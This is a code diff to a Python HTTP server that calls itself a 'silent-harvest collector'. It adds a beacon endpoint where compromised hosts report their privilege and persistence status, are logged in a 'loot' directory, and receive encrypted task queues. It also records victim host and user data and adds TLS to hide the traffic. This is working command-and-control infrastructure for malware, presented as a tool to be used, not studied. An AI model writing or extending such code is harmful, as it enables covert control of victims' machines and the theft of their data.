@@ -33,6 +33,7 @@ import sys
 import threading
 import time
 from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
+from urllib.parse import urlparse, parse_qs
 
 import shcrypto
 import term
@@ -64,6 +65,22 @@ def ip_allowed(ip, networks):
     return any(addr in net for net in networks)
 
 
+def _load_json(path, default):
+    try:
+        with open(path, "r", encoding="utf-8") as f:
+            return json.load(f)
+    except Exception:
+        return default
+
+
+def _save_json(path, obj):
+    os.makedirs(os.path.dirname(path), exist_ok=True)
+    tmp = path + ".tmp"
+    with open(tmp, "w", encoding="utf-8") as f:
+        json.dump(obj, f, indent=2)
+    os.replace(tmp, path)
+
+
 class Handler(BaseHTTPRequestHandler):
     protocol_version = "HTTP/1.1"
     timeout = 60  # dead/slow connections get dropped
@@ -87,9 +104,9 @@ class Handler(BaseHTTPRequestHandler):
                     self.client_address[0], self.command, self.path,
                     verdict, extra))
 
-    def _reply(self, code, body=b"ok\n"):
+    def _reply(self, code, body=b"ok\n", ctype="text/plain"):
         self.send_response(code)
-        self.send_header("Content-Type", "text/plain")
+        self.send_header("Content-Type", ctype)
         self.send_header("Content-Length", str(len(body)))
         self.end_headers()
         self.wfile.write(body)
@@ -120,9 +137,44 @@ class Handler(BaseHTTPRequestHandler):
         if self.path in ("/health", "/"):
             self._access("OK")
             self._reply(200, b"silent-harvest collector up\n")
-        else:
-            self._access("404")
-            self._reply(404, b"nope\n")
+            return
+        u = urlparse(self.path)
+        if u.path == "/beacon":
+            qs = {k: v[0] for k, v in parse_qs(u.query).items()}
+            hid = re.sub(r"[^A-Za-z0-9_.-]", "_", qs.get("id", "unknown"))[:80]
+            now = int(time.time())
+            with LOCK:
+                hosts = _load_json(os.path.join(self.loot_dir, "hosts.json"), {})
+                h = hosts.setdefault(hid, {"first_seen": now, "beacons": 0})
+                h.update({"last_seen": now, "version": qs.get("v", "?"),
+                          "elevated": qs.get("e", "?"),
+                          "persist": qs.get("p", "?"),
+                          "beacons": h.get("beacons", 0) + 1})
+                _save_json(os.path.join(self.loot_dir, "hosts.json"), hosts)
+                task = None
+                tpath = os.path.join(self.loot_dir, "tasks", hid + ".json")
+                q = _load_json(tpath, [])
+                if q:
+                    task = q.pop(0)
+                    _save_json(tpath, q)
+            self._access("BEACON", "id=%s%s" % (hid, " task!" if task else ""))
+            if task is None:
+                self._reply(204, b"")
+                return
+            blob = shcrypto.pack([("task.json",
+                                   json.dumps(task).encode(), None)],
+                                 self.server.psk,
+                                 victim_meta={"task": True})
+            term.cprint("[%s] %s  task '%s' -> %s" % (
+                time.strftime("%H:%M:%S"),
+                term.s("⟡ TASK", term.C.MAGENTA, term.C.BOLD),
+                term.s(str(task.get("id", "?")), term.C.BOLD),
+                term.s(hid, term.C.CYAN)))
+            sys.stdout.flush()
+            self._reply(200, blob, ctype="application/octet-stream")
+            return
+        self._access("404")
+        self._reply(404, b"nope\n")
 
     def do_POST(self):
         if not self._preflight():
@@ -161,6 +213,14 @@ class Handler(BaseHTTPRequestHandler):
             re.sub(r"[^A-Za-z0-9_.-]", "_", str(v.get("user", "unknown"))),
             int(v.get("ts", time.time())),
         )
+        with LOCK:
+            hosts = _load_json(os.path.join(self.loot_dir, "hosts.json"), {})
+            hid = "%s-%s" % (re.sub(r"[^A-Za-z0-9_.-]", "_", str(v.get("host", "unknown"))),
+                             re.sub(r"[^A-Za-z0-9_.-]", "_", str(v.get("user", "unknown"))))
+            h = hosts.setdefault(hid, {"first_seen": int(time.time()), "beacons": 0})
+            h.update({"last_seen": int(time.time()), "beacons": h.get("beacons", 0) + 1,
+                      "elevated": v.get("elevated"), "persist": v.get("persist", "?")})
+            _save_json(os.path.join(self.loot_dir, "hosts.json"), hosts)
         dest = os.path.join(self.loot_dir, vid)
         with LOCK:
             os.makedirs(os.path.join(dest, "parts"), exist_ok=True)
@@ -230,11 +290,14 @@ def main():
                     help="max requests per IP per minute (default 60)")
     ap.add_argument("--loot-dir", default=os.path.join(
         os.path.dirname(os.path.abspath(__file__)), "..", "loot"))
+    ap.add_argument("--tls-cert", default=None, help="PEM cert to serve TLS")
+    ap.add_argument("--tls-key", default=None, help="PEM private key for --tls-cert")
     args = ap.parse_args()
 
     psk = shcrypto.get_psk(args.psk)
     Handler.loot_dir = os.path.abspath(args.loot_dir)
     os.makedirs(Handler.loot_dir, exist_ok=True)
+    os.makedirs(os.path.join(Handler.loot_dir, "tasks"), exist_ok=True)
 
     Handler.auth_token = args.auth
     Handler.max_body = args.max_body * 1024 * 1024
@@ -260,6 +323,11 @@ def main():
 
     srv = Server((args.bind, args.port), Handler)
     srv.psk = psk
+    if args.tls_cert and args.tls_key:
+        import ssl
+        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
+        ctx.load_cert_chain(args.tls_cert, args.tls_key)
+        srv.socket = ctx.wrap_socket(srv.socket, server_side=True)
     term.init()
     term.print_banner()
     print()
